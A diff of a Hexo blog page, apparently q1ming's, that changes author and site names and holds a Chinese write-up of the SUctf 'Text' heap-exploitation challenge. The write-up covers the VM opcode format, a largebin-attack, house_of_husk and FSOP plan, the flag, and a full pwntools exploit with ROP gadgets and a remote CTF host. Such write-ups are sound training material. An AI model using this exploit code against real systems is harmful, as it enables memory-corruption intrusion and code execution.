@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SUctf-Text, Hexo">
+    <meta name="keywords" content="SUctf-Text, q1ming">
     <meta name="description" content="check
 
 
@@ -23,7 +23,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SUctf-Text | Hexo</title>
+    <title>SUctf-Text | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -70,7 +70,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -174,7 +174,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -413,9 +413,9 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="check"><a href="#check" class="headerlink" title="check"></a>check</h2><p><img src="/images/1736599978997.png" alt="1736599978997"></p>
-<p><img src="/images/1736600008245.png" alt="1736600008245"></p>
-<p><img src="/images/1736600456387.png" alt="1736600456387"></p>
+                <h2 id="check"><a href="#check" class="headerlink" title="check"></a>check</h2><p><img src="/images/1736599978997.png"></p>
+<p><img src="/images/1736600008245.png"></p>
+<p><img src="/images/1736600456387.png"></p>
 <h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>opcode:</p>
 <p>byte0: </p>
 <p>1:菜单堆：</p>
@@ -425,7 +425,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">alu2 : p8(2) + p8(idx) + p8(16)<br>	add: p8(2) + p8(idx) + p8(16) + p8(0x10) + p32(num1) + p32(num2) #存放到note的第一个int中<br>	sub: p8(2) + p8(idx) + p8(16) + p8(0x11) + p32(num1) + p32(num2) #num1-num2<br>	mul: p8(2) + p8(idx) + p8(16) + p8(0x12) + p32(num1) + p32(num2)<br>	div: p8(2) + p8(idx) + p8(16) + p8(0x13) + p32(num1) + p32(num2) #num1 / num2<br>	store: p8(2) + p8(idx) + p8(16) + p8(0x14) + p32(offset) + p64(con) #*(note+offset)=con<br>	load: p8(2) + p8(idx) + p8(16) + p8(0x15) + p32(offset) + p64(0) #将note中的内容存放到指令空间中<br>	show: p8(2) + p8(idx) + p8(16) + p8(0x16) + p32(offset) #打印load的数据<br>	<br>alu1 : p8(2) + p8(idx) + p8(17)<br>	rsh: p8(2) + p8(idx) + p8(17) + p8(0x10) + p32(num1) + p32(num2) #会使得note指针逐渐增加<br>	lsh: p8(2) + p8(idx) + p8(17) + p8(0x11) + p32(num1) + p32(num2)<br>	xor: p8(2) + p8(idx) + p8(17) + p8(0x12) + p32(num1) + p32(num2)<br>	or:  p8(2) + p8(idx) + p8(17) + p8(0x13) + p32(num1) + p32(num2)<br>	and: p8(2) + p8(idx) + p8(17) + p8(0x14) + p32(num1) + p32(num2)<br></code></pre></td></tr></table></figure>
 
 <p>3: exit</p>
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><img src="/images/1736609335876.png" alt="1736609335876"></p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><img src="/images/1736609335876.png"></p>
 <p>走house_of_husk取函数指针的汇编代码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0x00007f59f2267950:	mov    rsi,QWORD PTR [rax+rdx*8]<br>   0x00007f59f2267954:	test   rsi,rsi<br>   0x00007f59f2267957:	jne    0x7f59f22677a8<br><br>0x00007f59f22677a8:	movsxd rdx,DWORD PTR [r15+0x30]<br>   0x00007f59f22677ac:	mov    rcx,QWORD PTR [r15+0x38]<br>   0x00007f59f22677b0:	mov    r8,r15<br>   0x00007f59f22677b3:	mov    rdi,r14<br>   0x00007f59f22677b6:	mov    rax,QWORD PTR [rbp-0x8b8]<br>   0x00007f59f22677bd:	mov    DWORD PTR [rbp-0x938],r9d<br>   0x00007f59f22677c4:	shl    rdx,0x4<br>   0x00007f59f22677c8:	mov    BYTE PTR [rbp-0x930],r10b<br>   0x00007f59f22677cf:	add    rdx,rax<br>   0x00007f59f22677d2:	mov    BYTE PTR [rbp-0x8d0],r11b<br>   0x00007f59f22677d9:	call   0x7f59f22646e0<br>   0x00007f59f22677de:	movzx  r11d,BYTE PTR [rbp-0x8d0]<br>   0x00007f59f22677e6:	movzx  r10d,BYTE PTR [rbp-0x930]<br>   0x00007f59f22677ee:	cmp    eax,0xfffffffe<br>   0x00007f59f22677f1:	mov    r9d,DWORD PTR [rbp-0x938]<br>   0x00007f59f22677f8:	je     0x7f59f226795d<br>   0x00007f59f22677fe:	test   eax,eax<br>   0x00007f59f2267800:	js     0x7f59f22674a0<br>   0x00007f59f2267806:	mov    rsi,QWORD PTR [r15+0x18]<br>   0x00007f59f226780a:	mov    rdx,QWORD PTR [r15+0x20]<br><br></code></pre></td></tr></table></figure>
 
@@ -433,8 +433,8 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
 <p>因此存在一个越界写；</p>
 <p>本题只有_exit所以直接走IO_list_all是不行了；然而本题的malloc_assert存在一个writev系统调用，导致被ban了，所以也不行；</p>
 <p>最后的解决方案是，首先利用largebin attack覆盖IO_list_all，并布置相关的结构体；之后继续利用两次largebin attack，覆盖printf_table和arg_table，走house_of_husk，将控制流劫持到exit，然后走IO_list_all；</p>
-<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736670695272.png" alt="1736670695272"></p>
-<p><img src="/images/1736670641990.png" alt="1736670641990"></p>
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736670695272.png"></p>
+<p><img src="/images/1736670641990.png"></p>
 <p>SUCTF{C0n6r47u14710n5_0n_831n6_7h3_m4573r_0f_p01n73r_m0v3m3n7}</p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs [python]">from pwn import *<br>import sys<br><br>file = &quot;./pwn&quot;<br>if len(sys.argv) == 1 or sys.argv[1] == &#x27;l&#x27;:<br>    sh = process(file)<br>elif sys.argv[1] == &#x27;r&#x27;:<br>    sh = remote(&quot;1.95.76.73&quot;, 10011 )<br>elf = ELF(file)<br><br>def ru(string):<br>    sh.recvuntil(string)<br>def dbg(con=&#x27;&#x27;):<br>    if len(sys.argv) &gt; 1 and sys.argv[1] == &#x27;r&#x27;:<br>        return<br>    if isinstance(con, int):<br>        con = &quot;b *$rebase(&quot; + hex(con)+&quot;)&quot;<br>    gdb.attach(sh, con)<br>    pause()<br>def sl(content):<br>    sh.sendline(content)<br>def itr():<br>    sh.interactive()<br>context.log_level = &#x27;debug&#x27;<br>def get_heap():<br>    res = 0<br>    res = u64(sh.recvuntil(&quot;\x55&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    if res == 0:<br>        res = u64(sh.recvuntil(&quot;\x56&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    return res<br>def get_libc():<br>    res = 0<br>    res = u64(sh.recvuntil(&quot;\x7f&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    if res == 0:<br>        res = u64(sh.recvuntil(&quot;\x7e&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    return res<br>def get_tcache():<br>    res = u64(sh.recvuntil(&quot;\x05&quot;)[-5:].ljust(8, b&quot;\x00&quot;))<br>    return res<br><br>def add_note(idx, size):<br>    return p8(1) + p8(0x10) + p8(idx) + p32(size)<br>def free_note(idx):<br>    return p8(1) + p8(0x11) + p8(idx)<br><br>def add(num1, num2):<br>    return p8(16) + p8(0x10) + p32(num1) + p32(num2)<br>def sub(num1, num2):<br>    return p8(16) + p8(0x11) + p32(num1) + p32(num2)<br>def nul(num1, num2):<br>    return p8(16) + p8(0x12) + p32(num1) + p32(num2)<br>def div(num1, num2):<br>    return p8(16) + p8(0x13) + p32(num1) + p32(num2)<br>def store(offset, con):<br>    return p8(16) + p8(0x14) + p32(offset) + p64(con)<br>def load(offset):<br>    return p8(16) + p8(0x15) + p32(offset) + p64(0)<br>def show(offset):<br>    return p8(16) + p8(0x16) + p32(offset)<br><br>def rsh(num1, num2):<br>    return p8(17) + p8(0x10) + p32(num1) + p32(num2)<br>def lsh(num1, num2):<br>    return p8(17) + p8(0x11) + p32(num1) + p32(num2)<br>def _xor(num1, num2):<br>    return p8(17) + p8(0x12) + p32(num1) + p32(num2)<br>def _or(num1, num2):<br>    return p8(17) + p8(0x13) + p32(num1) + p32(num2)<br>def _and(num1, num2):<br>    return p8(17) + p8(0x14) + p32(num1) + p32(num2)<br><br>def cal_alu(idx):<br>    return p8(2) + p8(idx) <br><br>def func():<br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br><br>    code = add_note(0, 0x480) + add_note(1, 0x4a0) + add_note(2, 0x480) + add_note(3, 0x480) + add_note(4, 0x480) <br>    code += free_note(1) + add_note(5, 0x4f0)  + free_note(3)<br>    code += cal_alu(0) + _xor(1, 1) * 0x40 + load(0x398) + show(0x100000000-0xe) +load(0x3a8) + show(0x100000000-0xe)+ p8(0) + p8(3)<br>    sh.send(code)<br><br>    addr = get_libc()<br>    large = addr<br>    heap = get_heap()<br>    system = addr - 0x1ab800<br>    libc = ELF(&quot;./libc.so.6&quot;)<br>    base = system - libc.sym[&#x27;system&#x27;] + 0x10<br>    print(&quot;addr :&quot;, hex(addr))<br>    print(&quot;base :&quot;, hex(base))<br>    print(&quot;heap :&quot;, hex(heap))<br>    listall = base + libc.sym[&#x27;_IO_list_all&#x27;]<br>    stderr = base + libc.sym[&#x27;stderr&#x27;]<br>    function_table = base + 0x205660<br>    arg_table = base + 0x205668<br>    print(&quot;function_table :&quot;, hex(function_table))<br>    print(&quot;arg_table :&quot;, hex(arg_table))<br>    <br>    <br>    chunk1 = heap<br>    chunk3 = heap+0x4b0+0x490<br><br>    code = cal_alu(0)<br>    code += _xor(1, 1) * 0x40 + store(0x3a8, arg_table-0x20)<br>    code += p8(0) + add_note(6, 0x4f0) <br><br>    code += p8(3)<br><br>    <br><br>    <br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sh.send(code)<br><br>    #============================ 修复双链表 =====================================================<br>    code = cal_alu(0)<br>    code += _xor(1, 1) * 0x40 + store(0x3a0, chunk3)<br>    code += p8(0)<br>    code += cal_alu(2)<br>    code += _xor(1, 1) * 0x40 + store(0x3a8, chunk1)<br>    code += p8(0)<br><br>    code += p8(3)<br><br>    #==========================================================================================================<br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sh.send(code)<br><br><br>    #==========================================================================================================<br><br>    code = add_note(7, 0x480) + free_note(7) <br>    code += cal_alu(0)<br>    code += _xor(1, 1) * 0x40 + store(0x3a8, function_table-0x20)<br>    code += p8(0)+ add_note(8, 0x4f0) <br><br>    #============================ 修复双链表 =====================================================<br>    code += p8(3)<br><br>    <br>    #==========================================================================================================<br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sh.send(code)<br><br><br>    code = cal_alu(0)<br>    code += _xor(1, 1) * 0x40 + store(0x3a0, chunk3)<br>    code += p8(0)<br>    code += cal_alu(2)<br>    code += _xor(1, 1) * 0x40 + store(0x3a8, chunk1)<br>    code += p8(0)<br>    code += free_note(8) + free_note(6)<br>    code += p8(3)<br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sh.send(code)<br>    <br>    <br><br>    jumps = base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]<br><br>    #0x0000000000176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]<br>    magic = base + 0x0000000000176f0e    <br>    pop_rdi_ret = base + 0x000000000010f75b<br>    pop_rsi_ret = base + 0x0000000000110a4d<br>    pop_rdx_ret = base + 0x00000000000ab891  #or byte ptr [rcx - 0xa]<br>    pop_rcx_ret = base + 0x00000000000a876e<br>    pop_rax_ret = base + 0x00000000000dd237<br>    setcontext = base + libc.sym[&#x27;setcontext&#x27;]<br>    syscall = base + 0x98fa6<br>    ret = base + 0x000000000002882f<br>    _open = base + libc.sym[&#x27;open&#x27;]<br>    _read = base + libc.sym[&#x27;read&#x27;]<br>    _write = base + libc.sym[&#x27;write&#x27;]<br>      <br>    code = add_note(3, 0x480) + free_note(3) <br>    code += cal_alu(0)<br>    code += _xor(1, 1) * 0x40 + store(0x3a8, listall-0x20)<br>    code += p8(0)+ add_note(8, 0x4f0) + free_note(8)<br>    code += add_note(3, 0x480)<br>    <br><br>    #先修复chunk1<br>    code += cal_alu(0)<br>    code += _xor(1, 1) * 0x40 + store(0x3a8, chunk1)<br>    code += p8(0)<br>    code += p8(3)<br><br>    print(&quot;function_table :&quot;, hex(function_table))<br>    print(&quot;arg_table :&quot;, hex(arg_table))<br>    print(&quot;len ==&quot;, hex(len(code)))<br>    print(&quot;magic :&quot;, hex(magic))<br>    <br><br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sl(code)<br><br>    #申请chunk1 伪造结构<br>    code = add_note(1, 0x4a0)<br>    code += cal_alu(1)<br>    for i in range(4):<br>        code += store(i*8, 0)<br>    code += store(0x28-0x10, 1)<br>    code += store(0x88-0x10, chunk3+0x1000)<br>    code += store(0xa0-0x10, chunk1)<br>    code += store(0xd8-0x10, jumps)<br>    code += store(0xe0-0x10, chunk1)<br>    code += store(0x68-0x10, magic)<br><br>    code += store(0x38-0x10, chunk1+0x10+0x200)<br>    code += store(0x200+0x20, setcontext+61)<br>    code += store(0x200+0xa0, chunk1+0x10+0x300)<br>    code += store(0x200+0xa8, ret)<br>    <br>    #code += store(0x280-0x10, 0x7478742e67616c66) #flag.txt<br>    code += store(0x280-0x10, 0x67616c66) #flag<br><br>    code += store(0x300, pop_rdi_ret)<br>    code += store(0x308, chunk1+0x280)<br>    code += store(0x310, pop_rsi_ret)<br>    code += store(0x318, 0)<br>    code += store(0x320, pop_rax_ret)<br>    code += store(0x328, 2)<br>    code += store(0x330, syscall)<br>    code += store(0x338, pop_rdi_ret)<br>    code += store(0x340, 3)<br>    code += store(0x348, pop_rsi_ret)<br>    code += store(0x350, chunk1+0x1000)<br>    code += store(0x358, pop_rcx_ret)<br>    code += store(0x360, chunk1)<br>    code += store(0x368, pop_rdx_ret)<br>    code += store(0x370, 0x100)<br>    code += store(0x378, pop_rax_ret)<br>    code += store(0x380, 0)<br>    code += store(0x388, syscall)<br>    code += store(0x390, pop_rdi_ret)<br>    code += store(0x398, 1)<br>    code += store(0x3a0, pop_rsi_ret)<br>    code += store(0x3a8, chunk1+0x1000)<br>    code += store(0x3b0, pop_rcx_ret)<br>    code += store(0x3b8, chunk1)<br>    code += store(0x3c0, pop_rdx_ret)<br>    code += store(0x3c8, 0x100)<br>    code += store(0x3d0, pop_rax_ret)<br>    code += store(0x3d8, 1)<br>    code += store(0x3e0, syscall)<br><br>    code += p8(0)<br>    code += p8(3)<br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sl(code)<br><br>    <br><br>    code = cal_alu(3)<br>    code += store(0x320-0x10, base+libc.sym[&#x27;exit&#x27;])<br>    code += p8(0)<br>    code += p8(3)<br>    ru(&quot;Please input some text (max size: 4096 bytes):&quot;)<br>    sl(code)<br>   <br>    itr()<br>    <br><br><br>    <br><br>if __name__ == &quot;__main__&quot;:<br>    func()<br><br></code></pre></td></tr></table></figure>
 
@@ -454,7 +454,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -477,7 +477,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -590,51 +590,6 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2025/01/14/KEPLER/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="KEPLER">
-                        
-                        <span class="card-title">KEPLER</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            John Doe
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/paper/">
-                        <span class="chip bg-color">paper</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
                 <a href="/2025/01/14/SU_JIT/">
                     <div class="card-image">
                         
@@ -651,13 +606,13 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -673,6 +628,43 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
                         <span class="chip bg-color">VM</span>
                     </a>
                     
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/14/aboutme/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Hello">
+                        
+                        <span class="card-title">Hello</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q1ming
+                            
+                        </span>
+                    </div>
                 </div>
                 
             </div>
@@ -861,7 +853,7 @@ add_note ： p8(1) + p8(0x10) + p8(idx) + p32(size)free_note : p8(1) + p8(0x11) 
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
